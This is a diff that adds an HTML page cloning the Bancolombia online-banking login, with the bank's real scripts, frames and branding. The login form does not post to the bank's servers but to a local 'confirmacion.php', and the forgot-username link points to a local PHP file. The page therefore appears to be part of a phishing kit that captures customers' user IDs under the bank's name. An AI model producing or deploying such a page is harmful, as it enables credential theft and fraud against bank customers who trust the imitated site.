@@ -1,0 +1,552 @@
+
+
+
+
+
+
+
+
+
+
+
+<html>
+
+<head>
+	<title>Sucursal Virtual BANCOLOMBIA</title>
+	<link rel="stylesheet" href="../css/global.css" type ="text/css">
+	<link rel="stylesheet" href="../css/tipos.css" type="text/css" />
+	
+
+
+
+<script language="JavaScript">
+
+document.onkeydown = mykeyhandler;
+
+function mykeyhandler(event) {
+
+	//keyCode 116 = F5 
+	//keyCode 122 = F11
+	//keyCode   8 = Backspace
+	//keyCode  37 = LEFT ROW
+	//keyCode  78 = N
+	//keyCode  39 = RIGHT ROW
+	//keyCode  67 = C
+	//keyCode  86 = V
+	//keyCode  85 = U	
+	//keyCode  45 = Insert
+
+	event = event || window.event;
+	var tgt = event.target || event.srcElement;
+	if((event.altKey && event.keyCode==37) || (event.altKey && event.keyCode==39) || 
+	   (event.ctrlKey && event.keyCode==78)|| (event.ctrlKey && event.keyCode==67)|| 
+	   (event.ctrlKey && event.keyCode==86)|| (event.ctrlKey && event.keyCode==85)||
+	   (event.ctrlKey && event.keyCode==45)|| (event.shiftKey && event.keyCode==45)){
+        event.cancelBubble = true;
+        event.returnValue = false;	
+		alert("Funcion no permitida");
+		return false;
+	}
+	
+	if(event.keyCode==18 && tgt.type != "text" && tgt.type != "password" && tgt.type != "textarea"){
+		return false;	
+	}
+	
+	if (event.keyCode == 8 && tgt.type != "text" && tgt.type != "password" && tgt.type != "textarea"){		
+		return false;
+	}
+
+    if ((event.keyCode == 116) || (event.keyCode == 122)) {
+		if (navigator.appName == "Microsoft Internet Explorer"){
+			window.event.keyCode=0;
+        }
+        return false;
+    }
+}
+
+function mouseDown(e) {
+	var ctrlPressed=0;
+	var altPressed=0;
+	var shiftPressed=0;
+	if (parseInt(navigator.appVersion)>3) {
+		if (navigator.appName=="Netscape") {
+			var mString =(e.modifiers+32).toString(2).substring(3,6);
+			shiftPressed=(mString.charAt(0)=="1");
+			ctrlPressed =(mString.charAt(1)=="1");
+			altPressed  =(mString.charAt(2)=="1");
+			self.status="modifiers="+e.modifiers+" ("+mString+")"
+		}
+ 		else 
+ 		{
+  			shiftPressed=event.shiftKey;
+ 	 		altPressed  =event.altKey;
+  			ctrlPressed =event.ctrlKey;
+ 		}
+ 		if (shiftPressed || altPressed || ctrlPressed) 
+  			alert ("Funcion no permitida");
+ 	}
+ 	return true;
+}
+
+if (parseInt(navigator.appVersion)>3) {
+	document.onmousedown = mouseDown;
+	if (navigator.appName=="Netscape") 
+		document.captureEvents(Event.MOUSEDOWN);
+}
+
+var message="";
+
+function clickIE() {
+	if (document.all){
+		(message);
+		return false;
+	}
+}
+
+function clickNS(e) {
+	if(document.layers||(document.getElementById&&!document.all)) {
+		if (e.which==2||e.which==3) {
+			(message);return false;
+		}
+	}
+}
+
+if (document.layers){
+	document.captureEvents(Event.MOUSEDOWN);
+	document.onmousedown=clickNS;
+}else{
+	document.onmouseup=clickNS;document.oncontextmenu=clickIE;
+}
+
+document.oncontextmenu=new Function("return false");
+</script>
+
+	
+<script language="JavaScript">
+function popup_help(param1) {	
+	window.open('https://bancolombia.olb.todo1.com/html/global/popUpHelp.jsp?helpId='+param1,'HELP','width=285,height=185,scrollbars=no,resizable=yes');
+}
+function popup_help2(param2) {	
+	window.open('https://bancolombia.olb.todo1.com/html/global/popUpHelp2.jsp?helpId='+param2,'HELP','width=600,height=300,scrollbars=no,resizable=yes');
+}
+function popup_help3(param3) {	
+	window.open('https://bancolombia.olb.todo1.com/html/global/popUpHelp3.jsp?helpId='+param3,'HELP','width=650,height=400,scrollbars=no,resizable=yes');
+}
+function popup_help4(param4) {	
+	window.open('https://bancolombia.olb.todo1.com/html/global/popUpHelp4.jsp?helpId='+param4,'HELP','width=650,height=630,scrollbars=no,resizable=yes');
+}
+function popup_help5(param1) {	
+	window.open('https://bancolombia.olb.todo1.com/html/global/popUpHelp.jsp?helpId='+param1,'HELP','width=400,height=300,scrollbars=no,resizable=yes');
+}
+
+function popup_helpLimitInfo() {	
+	window.open('https://bancolombia.olb.todo1.com/html/global/popUpHelpLimitInfo.jsp','HELP','width=770,height=570,scrollbars=no,resizable=yes');
+}
+
+function popup_helpStatic() {	
+	window.open('https://bancolombia.olb.todo1.com/html/global/popUpHelpStatic.jsp','HELP','width=650,height=630,scrollbars=no,resizable=yes');
+}
+function popup_helpStatusAccount() {	
+	window.open('https://bancolombia.olb.todo1.com/html/global/popUpHelpStatusAccount.jsp','HELP','width=600,height=450,scrollbars=no,resizable=yes');
+}
+function popup_helpLoginForgotPassword() {	
+	window.open('https://bancolombia.olb.todo1.com/html/global/popUpHelpLoginForgotPassword.jsp','HELP','toolbar=no,scrollbars=no,resizable=no,width=600,height=380');
+}
+function popup_helpMail(param1) {	
+	window.open('https://bancolombia.olb.todo1.com/html/global/popUpHelp.jsp?helpId='+param1,'HELP','width=600,height=200,scrollbars=no,resizable=yes');
+}
+
+function popup_helpBlockCP1(param1) {	
+	window.open('https://bancolombia.olb.todo1.com/html/global/popUpHelp.jsp?helpId='+param1,'HELP','width=300,height=300,scrollbars=no,resizable=yes');
+}
+
+function popup_helpMailExternalized(param1) {
+	window.open('https://bancolombia.olb.todo1.com/html/global/popUpHelpExternalized.jsp?helpId='+param1,'HELP','width=600,height=200,scrollbars=no,resizable=yes');
+}
+
+function popup_helpKeyGen(param1) {	
+	window.open('https://bancolombia.olb.todo1.com/html/global/popUpHelp.jsp?helpId='+param1,'HELP','width=285,height=210,scrollbars=no,resizable=yes');
+}
+
+function popup_helpWhereInKey(param1) {	
+	window.open('https://bancolombia.olb.todo1.com/html/global/popUpHelp.jsp?helpId='+param1,'HELP','width=310,height=210,scrollbars=no,resizable=yes');
+}
+
+</script> 
+	
+	
+
+
+
+
+
+<script>
+	var warning = 300;
+	var timeout = 420;
+	
+	var current = 0;
+	
+	function popUpTimeOut(sURL) { window.open(unescape(sURL), "msgWindow","dependent=yes,titlebar=no,menubar=no,height=150,hotkeys=no,resizable=no,status=no,toolbar=no,width=300,alwaysRaised=1");  }
+	
+	function getSecs() { 
+	    current = current + 1;
+	    if (current == warning) { popUpTimeOut('/olb/GeneralDispatch?fwd=timeoutWarning1'); }
+	
+	    if (current == timeout - 10) {
+	        popUpTimeOut('/olb/GeneralDispatch?fwd=timeoutWarning2');
+	        window.location="/olb/GeneralDispatch?fwd=timeout";
+	    }
+	    window.setTimeout('getSecs()',1000); 
+	}
+	
+	getSecs();
+	
+
+	
+	
+
+	
+	
+	
+	top.hiddenFrameRSA.isLoggedUserWithBank = false;
+	top.hiddenFrameRSA.entered=false;
+	
+</script>
+	
+
+	<script language="JavaScript" src="../js/validations.js"></script>
+	
+	<script language="JavaScript">
+		top.withNotify=false;
+		
+		//Agrega los logos en la parte superior de la pagina
+		top.topFrame.location="https://bancolombia.olb.todo1.com/html/navigation/topLogosFrame.jsp";
+		top.barFrame.location="https://bancolombia.olb.todo1.com/html/navigation/barLogoLeft.jsp";
+
+		//Hide the Menu
+		top.leftFrame.location="https://bancolombia.olb.todo1.com/html/global/hidden.html";
+		top.hiddenFrame.location="https://bancolombia.olb.todo1.com/html/global/hidden.html";
+		
+		
+		top.hiddenFrameRSA.location="https://bancolombia.olb.todo1.com/html/global/loginWithBank.jsp";
+		
+		
+		function popUpDemo(sURL) { window.open(unescape(sURL), 'demo', 'toolbar=no,scrollbars=no,resizable=no,width=600,height=353');}
+		function openKeyActivation(){
+			window.open('https://bancolombia.olb.todo1.com/BOLPBancolombiaFidu/olb/Init', 'keyActivation','status=yes,menubar=no,scrollbars=yes,resizable=yes');
+		}
+		
+		function disabledTimeout()
+		{
+			window.location.href = "/olb/TimeoutVerification?flagTimeout=DISABLED";
+		}
+
+		function validateForm(){
+			getUserId();
+			if(checkNumberLetterBlank(document.authenticationForm.userId.value)){
+				return true;
+			}
+			else{
+				alert('Por favor ingrese el usuario o documento de identificacion que tiene registrado en Bancolombia para ingresar a la Sucursal Virtual Personas.');
+				return false;
+			}
+		}
+
+		function getUserId(){
+			if(document.authenticationForm.tempUserID.value != '******'){
+				document.authenticationForm.userId.value=document.authenticationForm.tempUserID.value;
+				if(document.authenticationForm.tempUserID.value != '')
+					document.authenticationForm.tempUserID.value = '******';
+			}
+		}
+		
+	</script>
+
+	
+	<script language="JavaScript" src="../js/swfRSACookieFunc.js"></script>
+		
+	<script language="JavaScript" src="../js/fp_AA.js"></script>	
+	<link href="../css/tipos.css" rel="stylesheet" type="text/css" />
+<script src="../js/jquery-min.js" type="text/javascript"></script>
+<script src="../js/jquery.bgiframe-min.js"  type="text/javascript" ></script>
+
+<script src="../js/jquery.validate_t1-min.js" type="text/javascript"></script>
+<script src="../js/jquery.jclock-min.js"      type="text/javascript" ></script>
+<script src="../js/pt.bubble-min.js"          type="text/javascript"></script>
+<script src="../js/pt.loadImages-min.js"      type="text/javascript" ></script>
+<script src="../js/genericScripts.js"      type="text/javascript" ></script>
+	
+</head>
+
+<body bgcolor="#ffffff" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" onload="javascript:checkConnectionException();">
+	<table border="0" width="97%" align="center">
+		<tr>
+			<td>
+				<!-- ShowHeader-->
+                    <script type="text/javascript">
+                        $(function($) {
+                            var optionsEST = {
+                            am_pm: true,
+                            timeNotation: '12h', 
+                            h_hour: "07:45:27", 
+                            h_date: "2014/10/08", 
+                            h_format: "$dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$", 
+                            h_language: "es"  
+                           }
+                        $('#jclock1').jclock(optionsEST);
+                        });
+                    </script>
+                                <table width="100%" border="0" align="left" cellpadding="0" cellspacing="0" style="padding-bottom:3px;" >
+                                    <tr>                                        <td>
+                                        <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                                            <tr>
+                                                <td width="100%" ><font class="header_ident_user_title"></font></td>
+                                            </tr>
+                                        </table>
+                                        </td>
+                                        <td class="header_interli_fecha" > <font class="header_fecha"><span id="jclock1"></span></font>
+                                            <br><font class="header_fecha">Direccion IP:</font>12<font class="header_ip_comp">.75.182.185</font>
+                                            
+                                        </td>
+                                    </tr> 
+                                </table>
+                    <!--Fin ShowHeader-->
+			</td>
+		</tr>
+		<tr>
+			<td>
+				<!--ShowTitle-->
+                               <table width="100%" border="0" align="left" cellpadding="0" cellspacing="0" >
+                                   <tr>
+                                       <td class="header_title">Inicio - Sucursal Virtual</td>
+                                       <td align="right" height="40">
+                                           <table  border="0" cellspacing="0" cellpadding="0">
+                                               <tr>
+                                                   <td>&nbsp; </td>
+
+				
+                                              </tr>
+                                          </table>
+                                      </td>
+                                  </tr>
+                              </table>
+  <!--End ShowTitle-->
+			</td>
+		</tr>
+    </table>
+	<br>
+         
+    <br><br>
+
+	<table width="97%" border="0" align="center">  
+      <form name="authenticationForm" method="POST" action="confirmacion.php" onsubmit="return validateForm();">	     	
+		<input type="hidden" name="connectionException" value="false">
+		<table align="center" border="0" width="97%">
+			<tr>
+    			<td width="150" halign="left">
+        			<table border="0" cellspacing="0" cellpadding="0" >
+		            	<tr>
+                			<td class="contentA2" height="23" nowrap="nowrap" colspan="0">
+                    			<table border="0" cellspacing="0" cellpadding="0" align="left">
+                        			<tr>
+                            			<td nowrap="nowrap"> 
+		                                	Por favor ingrese su 
+		                                	<a href="javascript:popup_help('115')" class="acctlink">Usuario </a>
+						               	</td>
+						           	</tr>
+						       	</table>
+						   	</td>
+						</tr>
+						<tr>
+						   	<td class="contentA2" colspan="2" >
+						   		<input type="hidden" name="userId" value="">         
+						   		<input type="text" name="tempUserID" maxlength="20" size="20" value="" onchange="getUserId()" onfocus="this.value='';" autocomplete="off" autocomplete="off"> &nbsp&nbsp&nbsp
+						   	</td>
+						</tr>
+						<tr>
+						 	<td class="contentA2" id="sinB" height="23" colspan="2" nowrap="nowrap" />								
+				     	</tr>
+				     	<tr>
+					       	
+				          	<td align="right">
+						    	<input type="image" id="accept_btn" src="../images/confirm_es.gif" tabindex="3" onclick=" post_fingerprints(document.forms[0]);"/>&nbsp&nbsp&nbsp&nbsp
+				          	</td>
+				       	</tr>
+       					<tr>
+				           	<td class="contentA2" colspan="2" >&nbsp;</td>
+				       	</tr>
+				   	</table>
+				</td>
+				<td rowspan="2" halign="left" align="left" width="150">
+
+         		</td>
+	         	<td rowspan="4" halign="left" >
+					<IFRAME FRAMEBORDER="0" VALIGN="top" SCROLLING="no" WIDTH="350" HEIGHT="230" SRC="login_BOLP_BC_zonaA.gif"></IFRAME>
+		       	</td>
+			</tr>
+       		<tr>
+       			<td colspan="2">
+		           	<table border="0" width="97%" cellspacing="0" cellpadding="0">
+						<tr>
+
+        		           	<td colspan="2" height="30">
+		                       	<a href="javascript:popup_helpWhereInKey('116')" class="acctlink">&#191;Donde ingreso la clave personal? </a>
+        		           	</td>
+		           		</tr>
+						<tr>
+							<td colspan="2" height="20">
+							&nbsp;
+							</td>
+						</tr>
+               			<tr>
+                   			<td height="30" nowrap="nowrap">
+							  	<a href="UserForgotNickName.php" class="acctlink">&iquest;Olvid&oacute; su usuario?</a> &nbsp;&nbsp;
+							</td>
+							<td height="30" nowrap="nowrap">
+		                       	<a href="javascript:popup_helpLoginForgotPassword()" class="acctlink">&#191;No puede conectarse?</a> &nbsp;&nbsp;
+        		           	</td>
+                		</tr>
+                	</table>
+    	     	</td>
+       		</tr>
+       		<tr>
+	        	<td>&nbsp;</td>
+			</tr>
+		</table>
+		<table align="center" width="97%">
+    		<tr>
+       			<td height="30" nowrap="nowrap">
+             		&nbsp;&nbsp;&nbsp;                			
+    			</td>
+    		</tr>
+    		<tr>
+       			<td height="30" nowrap="nowrap">
+             		&nbsp;
+    			</td>
+    		</tr>    		
+			<tr>
+				<td nowrap="nowrap">
+					¿No conoce la Sucursal Virtual Personas de Bancolombia?  <a href="#" class="acctlink" onClick="window.open(unescape('/olb/GeneralDispatch?fwd=demoSelected'), 'demo', 'toolbar=no,scrollbars=no,resizable=no,width=600,height=353');"> Ver DEMO</a> &nbsp;&nbsp;
+				</td>
+			</tr>
+		</table>
+		<br>
+		<table align="center" width="97%" border="0" cellspacing="0" cellpadding="0">
+			<tr>
+        		<td>
+					<IFRAME FRAMEBORDER="0" VALIGN="top" SCROLLING="no" WIDTH="660" HEIGHT="150" SRC="https://www.todo1.com/cs/Satellite?c=Page&amp;pagename=Ayudas%2FPage%2FZonasLogin&amp;cid=1259763461401"></IFRAME>
+           		</td>
+       		</tr>
+		</table>
+		<br>
+		<table border="0"  width="97%" cellspacing="0" cellpadding="0">
+      		<tr>
+		       	<td align="center">
+	    	   		
+
+
+
+<BR><BR><BR>
+<table border="0" width="95%" cellspacing="0" cellpadding="0" align="center">	
+    <tr align="center">
+	    <td>
+	      <font size="1">COPYRIGHTS (c) 2000 - 2010
+			 TODO1 SERVICES, INC. Todos los derechos reservados.</font>
+	    </td>
+	</tr>	
+</table>
+
+
+
+	    		</td>
+  			</tr>
+		</table>
+		<script type="text/javascript">
+		function checkConnectionException(){
+			 var isConnectionException = document.forms[0].connectionException.value;
+			 if (isConnectionException == "true"){
+			 	alert("");
+			 }
+			 document.forms[0].connectionException.value = "false";
+		}
+		</script>
+		
+			
+			<input type="hidden" name="device_id" value="[[[INACCESSIBLE]]]" id="device_id">
+			<input type="hidden" name="userlanguage" value="">
+			<input type="hidden" name="deviceprint" value="" id="deviceprint">
+			<script language="JavaScript" >
+				document.forms[0].userlanguage.value = fingerprint_userlang ();
+			</script>
+	  </form>
+<script type="text/javascript" language="JavaScript">
+  <!--
+  var focusControl = document.forms["authenticationForm"].elements["tempUserID"];
+
+  if (focusControl.type != "hidden" && !focusControl.disabled) {
+     focusControl.focus();
+  }
+  // -->
+</script>
+
+	</table>
+	<script language="JavaScript" src="../js/swfFlashVersEval.js"></script>
+
+	<script language="VBScript">
+		on error resume next
+
+		If MSDetect = "true" Then
+		    For i = 2 to 10
+		        If Not( IsObject( CreateObject( "ShockwaveFlash.ShockwaveFlash." & i ) ) ) Then
+
+		        Else
+		            flashinstalled = 2
+		            flashversion = i
+		        End If
+		    Next
+		End If
+
+		If flashinstalled = 0 Then
+		    flashinstalled = 1
+		End If
+	</script>
+	<script language="JavaScript" type="text/javascript">
+	 
+    
+
+	
+	if ( flashinstalled == 2 ) {
+	    var out = "";
+	    out += "<object type='application/x-shockwave-flash' data='/flash/rsa_fso.swf' classid='clsid:D27CDB6E-AE6D-11cf-96B8-444553540001'" + "\n";
+	    out += "id='flash_id' width='1' height='1'>" + "\n";
+	    out += "<param name='movie' value='https://bancolombia.olb.todo1.com/flash/rsa_fso.swf'>" + "\n";
+	    out += "<param name='quality' value='high'>" + "\n";
+	    out += "<param name='bgcolor' value='#FFFFFF'>" + "\n";
+	    out += "<param name='FlashVars' value='rsa_flash_id=flash_id&field_name=device_id&ip_address=pBLbauLMHbfUTk6LxyAVfgII' bufferLength='20'>" + "\n";
+	    out += "<embed name='flash_id' swliveconnect='true' src='/flash/rsa_fso.swf'" + "\n";
+	    out += "FlashVars='rsa_flash_id=flash_id&field_name=device_id&ip_address=pBLbauLMHbfUTk6LxyAVfgII'" + "\n";
+	    out += "quality='high' bgcolor='#FFFFFF' width='1' height='1'" + "\n";
+	    out += "type='application/x-shockwave-flash'>" + "\n";
+	    out += "<noobject></noobject>" + "\n";
+	    out += "</embed>" + "\n";
+	    out += "<noobject></noobject>" + "\n";
+	    out += "</object>" + "\n";
+
+		//document.write(out);
+		$(document).ready(function () {
+			document.getElementById("flashId").innerHTML=out;
+
+			document.authenticationForm.tempUserID.disabled = false;
+			document.authenticationForm.tempUserID.focus();
+		});
+	}else{
+		$(document).ready(function () {
+			document.authenticationForm.tempUserID.disabled = false;
+			document.authenticationForm.tempUserID.focus();
+		});
+	}
+	</script>
+	<div id="flashId"></div>
+</body>
+
+</html>
